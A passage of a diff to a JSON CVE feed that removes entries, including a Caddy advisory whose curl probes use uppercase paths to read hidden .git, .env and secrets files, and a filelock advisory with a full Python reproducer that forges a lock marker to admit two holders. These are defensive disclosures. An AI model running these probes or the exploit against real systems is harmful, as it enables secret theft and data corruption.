container):\n\n```\n/srv/.git/HEAD                \"ref: refs/heads/main\"\n/srv/.GIT/HEAD                \"ref: refs/heads/main (UPPERCASE BYPASS)\"\n/srv/.env                     \"DATABASE_URL=postgres://user:pass@host\"\n/srv/.ENV                     \"DATABASE_URL=postgres://user:pass@host (UPPERCASE BYPASS)\"\n/srv/secrets/api.txt          \"supersecret_api_key=sk_live_real\"\n/srv/SECRETS/api.txt          \"supersecret_api_key=sk_live_real (UPPERCASE BYPASS)\"\n```\n\nTest transcript (all three hide rules — `.git`, `.env`, `secrets` — bypassed via uppercase):\n\n```\nPS> curl.exe -i http://localhost:8080/.git/HEAD\nHTTP/1.1 404 Not Found\nContent-Length: 0\n\nPS> curl.exe -i http://localhost:8080/.GIT/HEAD\nHTTP/1.1 200 OK\nContent-Length: 40\nref: refs/heads/main (UPPERCASE BYPASS)\n\nPS> curl.exe -i http://localhost:8080/.env\nHTTP/1.1 404 Not Found\nContent-Length: 0\n\nPS> curl.exe -i http://localhost:8080/.ENV\nHTTP/1.1 200 OK\nContent-Length: 58\nDATABASE_URL=postgres://user:pass@host (UPPERCASE BYPASS)\n\nPS> curl.exe -i http://localhost:8080/secrets/api.txt\nHTTP/1.1 404 Not Found\nContent-Length: 0\n\nPS> curl.exe -i http://localhost:8080/SECRETS/api.txt\nHTTP/1.1 200 OK\nContent-Length: 52\nContent-Type: text/plain; charset=utf-8\nsupersecret_api_key=sk_live_real (UPPERCASE BYPASS)\n```\n\nThree separate hide rules, three separate uppercase bypasses, all 200 OK with the \"hidden\" content served.\n\n### Why this matters in practice\n\n`.git`, `.env`, and `secrets/` are three of the most common entries in production Caddy `hide` configurations because they correspond to high-value attacker targets:\n- `.git/HEAD` + `.git/config` + `.git/objects/` → source code disclosure\n- `.env` → credentials, API keys, database connection strings\n- `secrets/` → operator-named bucket of anything sensitive\n\nThe bug means that on macOS and Windows hosts (and a subset of Linux hosts), the `hide` directive provides **no protection at all** for these files — only psychological protection. An attacker familiar with this bug will probe with case variants before assuming the files aren't there.\n\n### Suggested fix\n\nIn `fileHidden()`, on platforms with case-insensitive filesystems (or when the configured filesystem is case-insensitive), perform the match against the lowercase request path and lowercase pattern. Go's standard library does not expose a portable \"is this filesystem case-insensitive\" check, so a reasonable conservative approach is to always lowercase both sides on `GOOS=darwin` and `GOOS=windows`, and to document for Linux operators that they should not rely on `hide` if their filesystem has `casefold` enabled or if they manage their files with case-folding tools.\n\nAlternative: enforce that paths matched by `hide` are also matched case-insensitively on all platforms, with an opt-out for operators who genuinely need case-sensitive matching.\n\n## Reproduction kit\n\nA full reproduction kit (Caddyfiles, docker-compose.yml files, runnable PoCs) is available on request. All exploits in this report were verified against the unmodified official `caddy:2.11.3` Docker image.\n\n## Reporter\n\nIndependent security research. No prior coordination, no other parties notified, no public disclosure prior to this report. Happy to coordinate on disclosure timeline and credit.",
-      "cvssScore": 6.5,
-      "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-94",
-        "name": "Improper Control of Generation of Code ('Code Injection')"
-      },
-      "references": [
-        "https://github.com/caddyserver/caddy/security/advisories/GHSA-j8px-rmrx-76h9",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77281",
-        "https://github.com/caddyserver/caddy/pull/7761",
-        "https://github.com/caddyserver/caddy/commit/176b043b0104cee3f894023cd5a598ac29e404bb",
-        "https://github.com/caddyserver/caddy/releases/tag/v2.11.4"
-      ],
-      "vulnerableProducts": [
-        "github.com/caddyserver/caddy/v2 go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0276",
-      "summary": "Buffer overflow in Pi3Web 2.0.1 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a GET request with a large number of / characters.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2003-06-16",
+      "published": "2000-05-22",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=105155818012718&w=2",
-        "http://marc.info/?l=bugtraq&m=105275789410250&w=2",
-        "http://www.securityfocus.com/bid/7555",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11889",
-        "http://marc.info/?l=bugtraq&m=105155818012718&w=2"
+        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0305.html",
+        "http://www.osvdb.org/1346",
+        "http://www.securityfocus.com/bid/1238",
+        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=20000523100045.B11049%40HiWAAY.net",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0305.html"
       ],
       "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2003-0277",
-      "summary": "Directory traversal vulnerability in normal_html.cgi in Happycgi.com Happymall 4.3 and 4.4 allows remote attackers to read arbitrary files via .. (dot dot) sequences in the file parameter.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2003-06-16",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=105276130814262&w=2",
-        "http://www.securityfocus.com/bid/7559",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11987",
-        "http://marc.info/?l=bugtraq&m=105276130814262&w=2",
-        "http://www.securityfocus.com/bid/7559"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-112939",
-      "summary": "`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async variants and a `FileLock` that has fallen back to a soft lock on `ENOSYS` decide from the record inside the marker file whether its owner is gone. The marker is the file whose presence says a process holds the lock. They do not check who could have written that record.\n\nA local user who can write the marker but cannot remove it rewrites the holder's record to name a dead PID (process id). That position arises with an explicit `mode` with group or other write bits, or the default mode under a lax umask (the process setting that strips permission bits from new files), in a sticky or otherwise non-removable directory. The sticky bit is a directory flag that lets only a file's owner remove or rename it. The next contender running as the holder's account, or root, judges the lock stale, removes the live marker on that user's behalf and acquires it. Two processes then run the critical section together and neither gets an error. Affected versions are filelock 3.22.0 through 4.2.0 (finding `ANT-2026-W1H9NXUH`).\n\n## Severity\n\n**CVSS 3.1 `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N` scores 4.7 (Medium).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:H` (high attack complexity): the marker must carry group or other write bits (an explicit permissive `mode`, or umask `002`/`000` with a shared group), and a contender of the holder's account must ask for the lock while the forged record is in place. `I:H` (high integrity impact): two holders then write whatever the lock protects, and the holder is not told. `C:N` and `A:N` (no confidentiality or availability impact). `S:U` (scope unchanged). Classification from the review: **security, conditional** on another user being able to write the live marker. The scanner rated it high (CWE-345). The default mode under umask `022` is not affected.\n\n## Scope and preconditions\n\n- The other user can write the marker. The application passes a `mode` with group or other write bits, which `fchmod` applies as given since 4.1.0. `0o666` is a common choice for a lock shared between accounts, although a soft-lock contender of another account waits as well on a `0o644` marker, since contenders only read and rename. Or the application uses the default mode (`0o666` through the umask) under umask `002` in a directory whose group the other user belongs to, or under umask `000`. The default mode under umask `022` is not affected.\n- The other user cannot remove the marker itself: the directory is sticky, or the other user cannot write it at all (a `0755` directory owned by the lock's user gives the same overlap). In a non-sticky shared directory the other user can unlink the marker without filelock, and filelock adds nothing.\n- A contender that may rename the marker asks for the lock: another process of the holder's account (several workers of one user) or root. A contender of another unprivileged account cannot rename the marker in a sticky directory and times out.\n- The finding reaches every class that publishes a soft marker: `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async variants, and `FileLock(mode=0o666)` on a filesystem where `flock` (a kernel lock on an open file) fails with `ENOSYS`.\n\nThese protections against another local user hold only when no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it, which no file-based lock can defend against.\n\n## Affected code\n\nAt the scanned commit b831496: the create mode in [`SoftFileLock._acquire`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L67-L71), the explicit-mode `fchmod` in [`_apply_explicit_mode`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L100-L105), the trusting verdict in [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123) and the [`owner_is_stale`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_identity.py#L64-L79) it relies on; the same call in [`MarkerSoftFileLock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_marker.py#L74-L81) and [`SoftFileLease`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_lease.py#L229-L256).\n\n## Introduced\n\nThe stale verdict that trusts the record came in with e35c3afac473 (\"feat(soft): detect and break stale locks\", #476, 2026-02-13), first released in 3.22.0. From then on a marker left group- or other-writable by the umask is forgeable. The reproducer's exact configuration, an explicit `mode=0o666` under umask `022`, needs 66d309d (\"fix(soft): honour mode and tighten marker grammar\", #807), first released in 4.1.0. Both match the git tags.\n\n## Mechanism\n\nA contender whose `O_CREAT | O_EXCL` create fails with `EEXIST` goes to `_try_break_stale_lock`. `_read_lock_file` makes sure the path is a regular file (`lstat`, `O_NOFOLLOW` open, `fstat`) and returns its content, mtime and inode (the kernel's identity for a file, independent of its name). It has the `fstat` result in hand but does not look at `st_uid` or `st_mode`. The code parses the content into `pid`, `hostname` and start token and hands them to `owner_is_stale`, whose docstring promises to return `True` \"only when this process can prove the exact recorded owner is dead\". That proof holds only if the owner wrote the record. A process of another account that can open the marker for writing uses `O_WRONLY | O_TRUNC` (no `O_CREAT`, so `fs.protected_regular` does not block it) and writes `2147483647\\n<host>\\n`, keeping the host line. The host matches, PID 2147483647 does not exist, and `owner_is_stale` returns `True`.\n\n`break_lock_file` renames the marker to `<lock>.break.<pid>.<token>` and unlinks it. Its mtime and inode guard compares against what the contender read after the rewrite, so it passes. The contender, which runs as the marker's owner, does the rename, so the sticky bit allows it. On the next poll the contender's `O_EXCL` create succeeds. The first holder is not told: `SoftFileLock` has no heartbeat, and on release `_unlink_open_marker` finds another inode or no file at the path and returns without an error.\n\nOther records lead to the same break, each run by the scanner the same way: the holder's own PID and host with a different third line (`owner_is_stale` reads a live PID with another start token as a recycled PID); an empty file (malformed, broken after `MALFORMED_LOCK_AGE_THRESHOLD`, 2 s). `MarkerSoftFileLock` and `SoftFileLease` apply `owner_is_stale` to the `pid=`, `host=` and `start=` fields of a protocol 2 record, and rewriting `pid=` admitted a second process for both. A `SoftFileLease` holder learns of it at its next heartbeat through `on_compromise`; `SoftFileLock` and `MarkerSoftFileLock` holders do not learn of it at all.\n\nThe marker becomes writable by another account in two ways. An explicit `mode` with group or other write bits goes through `fchmod`, so the umask does not narrow it (`test_lock_mode_soft` at the scanned commit pins `-rw-rw-rw-` under umask `022`). The default mode passes `0o666` to `os.open`, so under umask `002` the marker is `0o664`. With no `mode` argument, in a setgid and sticky group directory (`3770`), a second member of the group rewrote the marker and a second process of the holder's user acquired the same way. Under umask `000` the marker is `0o666` and any local user can rewrite it. `FileLock(mode=0o666)` on a filesystem where `flock` fails with `ENOSYS` falls back to `SoftFileLock` and produces the same `-rw-rw-rw-` marker (confirmed with `fcntl.flock` replaced by a stub raising `ENOSYS`). With `mode=0o644`, or no `mode` under umask `022`, the other user's open fails with `EACCES` and the second process times out.\n\n## Reproduction\n\nThe scanner's reproducer for `ANT-2026-W1H9NXUH`, quoted as received. It ran against commit `b831496b0273`.\n\n**`repro`**\n\n```python\n#!/usr/bin/env python3\nimport os\nimport pwd\nimport shutil\nimport stat\nimport subprocess\nimport sys\nimport tempfile\nimport time\n\n# root bypasses file permissions, so each party runs as one of the image's unprivileged accounts\nAS_VICTIM = [\"runuser\", \"-u\", \"victim\", \"--\", sys.executable]\nAS_ATTACKER = [\"runuser\", \"-u\", \"attacker\", \"--\"]\nWORKER = \"/tmp/repro.d/worker.py\"\nREWRITE_MARKER = \"/tmp/repro.d/rewrite_marker.py\"\n\n# set up: a sticky, world-writable directory like /tmp; both workers print \"entered\" / \"left\" into one shared log\nshared_dir = tempfile.mkdtemp(prefix=\"shared-\", dir=\"/tmp\")\nos.chmod(shared_dir, 0o1777)\nlock_path = os.path.join(shared_dir, \"cache.lock\")\nlog_path = os.path.join(shared_dir, \"order.log\")\nlog = open(log_path, \"w\")\n\nfirst = subprocess.Popen([*AS_VICTIM, WORKER, lock_path, \"first\", \"6\"], stdout=log)\nwhile \"first entered\" not in open(log_path).read():\n    assert first.poll() is None, \"the first worker did not get the lock\"\n    time.sleep(0.05)\n\nmarker = os.stat(lock_path)\nprint(\"marker:\", stat.filemode(marker.st_mode), pwd.getpwuid(marker.st_uid).pw_name, repr(open(lock_path).read()))\n\n# before the attack: the second worker times out, and the attacker cannot delete the marker from the sticky directory\nsecond_before = subprocess.run([*AS_VICTIM, WORKER, lock_path, \"second\", \"0.5\"], stdout=log, stderr=subprocess.PIPE, text=True)\nprint(\"second worker:\", second_before.stderr.splitlines()[-1])\nassert \"Timeout\" in second_before.stderr\nrm = subprocess.run([*AS_ATTACKER, \"rm\", \"-f\", lock_path], capture_output=True, text=True)\nprint(\"attacker:\", rm.stderr.strip())\nassert rm.returncode != 0\n\n# attack: no check=True, because under a fix the marker is not writable by others, and then this step fails\nsubprocess.run([*AS_ATTACKER, sys.executable, REWRITE_MARKER, lock_path])\nprint(\"marker after the attack:\", repr(open(lock_path).read()))\n\n# the second worker tries again, exactly as before\nsubprocess.run([*AS_VICTIM, WORKER, lock_path, \"second\", \"0.5\"], stdout=log)\nprint(\"first worker exit status:\", first.wait())\n\n# check: a correct lock keeps the second worker out until the first has left\norder = open(log_path).read().splitlines()\nprint(\"order:\", order)\nshutil.rmtree(shared_dir)\nprint(\"BUG\" if order == [\"first entered\", \"second entered\", \"second left\", \"first left\"] else \"OK\")\n```\n\n**`repro.d/rewrite_marker.py`**\n\n```python\n#!/usr/bin/env python3\n# The attacker, another account: overwrite the live holder's record in place with one naming a PID that cannot exist.\nimport os\nimport sys\n\nlock_path = sys.argv[1]\nNO_SUCH_PID = 2**31 - 1  # the largest PID the marker parser accepts; Linux pid_max is at most 2**22\n\nholder_host = open(lock_path).read().splitlines()[1]  # owner_is_stale only judges records from its own host\nmarker = os.open(lock_path, os.O_WRONLY | os.O_TRUNC)  # no O_CREAT, so fs.protected_regular does not refuse it\nos.write(marker, f\"{NO_SUCH_PID}\\n{holder_host}\\n\".encode())\nos.close(marker)\n```\n\n**`repro.d/worker.py`**\n\n```python\n#!/usr/bin/env python3\n# One of several workers of the victim's application; they take turns under a soft lock in a shared directory.\nimport sys\nimport time\n\nfrom filelock import SoftFileLock\n\nlock_path, name, work_seconds = sys.argv[1], sys.argv[2], float(sys.argv[3])\n\n# mode=0o666 so that the lock file can be used from several accounts\nwith SoftFileLock(lock_path, mode=0o666, timeout=1):\n    print(name, \"entered\", flush=True)\n    time.sleep(work_seconds)\n    print(name, \"left\", flush=True)\n```\n\n## Attack sequence\n\n```mermaid\nsequenceDiagram\n    participant H as holder (uid victim)\n    participant M as cache.lock (0666, owner victim, sticky dir)\n    participant A as other account (uid attacker)\n    participant C as contender (uid victim)\n    H->>M: O_CREAT|O_EXCL create, fchmod 0o666, write \"pid host token\"\n    C->>M: O_EXCL fails, read record: holder alive, Timeout\n    A->>M: rm: EPERM (sticky directory)\n    rect rgb(255, 214, 214)\n        A->>M: open O_WRONLY|O_TRUNC, write \"2147483647 host\"\n        C->>M: read record, owner_is_stale: PID 2147483647 is dead\n        C->>M: rename to cache.lock.break.*, unlink (the owner may)\n        C->>C: next poll: O_EXCL succeeds, enters beside H\n        Note over H,C: both inside, no error, H's release finds another inode and returns\n    end\n```\n\n## Evidence\n\nThe scanner's reproducer runs two `victim` workers on `with SoftFileLock(path, mode=0o666, timeout=1):` in a root-owned `1777` directory under `/tmp` (overlayfs, `fs.protected_regular=2`), with `attacker` uid 1001 sharing no group with `victim`. It printed the marker as `-rw-rw-rw- victim '<pid>\\n<host>\\n<start token>\\n'`, the second worker's `Timeout`, `rm: cannot remove ...: Operation not permitted` for `attacker`, the marker after the rewrite as `'2147483647\\n<host>\\n'`, first worker exit status 0, and the log order `['first entered', 'second entered', 'second left', 'first left']`. The second worker entered and left while the first was still inside its `with` block, about 50 ms after the rewrite, on its second poll. It prints `BUG` every time, in about 6 s. Our review ran the same reproducer: `BUG` on 4.2.0, `OK` on the head of #836. The review also tried umask `000` with the default mode.\n\n## Impact\n\nA local user who can write a soft lock's marker but cannot remove it gets a second process admitted into the critical section while the first holder is still inside. With no `lifetime` set, `SoftFileLock` and `MarkerSoftFileLock` give neither process a signal. Whatever the lock protects (a cache, an install directory, a state file) then has two concurrent writers. The other user chooses the moment and gains nothing else: it touches no file other than the marker. The process that rewrites the record runs under a different UID from the holder; the same-UID contender only follows the protocol.\n\n## Workarounds\n\nDo not give soft markers group or other write bits: pass no `mode` (or `mode=0o644`) under umask `022`. A soft-lock contender of another account waits as well on a `0o644` marker, because contenders only read and rename. The write bits matter only for the native `flock` lock and for `FileLock`'s first open before it falls back to a soft lock. Avoid umask `002` or `000` for processes that take soft locks in directories shared with other accounts, and keep lock files in a directory other users cannot write.\n\n## Patched version\n\n4.2.1.\n\nFix: https://github.com/tox-dev/filelock/pull/836\n\n## Credits\n\nReported by Anthropic's OSS Scanner (automated analysis), 15 October 2026; reviewed by the maintainers.\n\n- 2026-10-15 23:08 UTC: report received (finding `ANT-2026-W1H9NXUH`, scanned commit b831496b0273)\n- 2026-10-16 00:46 UTC: draft advisory\n- 2026-10-16 01:16 UTC: fix PR #836 opened",
-      "cvssScore": 4.7,
-      "severity": "Medium",
-      "published": "2026-10-28",
-      "modified": "2026-10-28",
-      "cwe": {
-        "cwe_id": "CWE-345",
-        "name": "Insufficient Verification of Data Authenticity"
-      },
-      "references": [
-        "https://github.com/tox-dev/filelock/security/advisories/GHSA-rfpc-qcw5-3pc4",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-112939",
-        "https://github.com/tox-dev/filelock/pull/836",
-        "https://github.com/tox-dev/filelock/commit/eeceaa846cbe4df72718d94c8371ca1ab8f5b3cc",
-        "https://github.com/tox-dev/filelock/releases/tag/4.2.1"
-      ],
-      "vulnerableProducts": [
-        "filelock pip"
-      ],
       "isExploited": false
     }
   ]
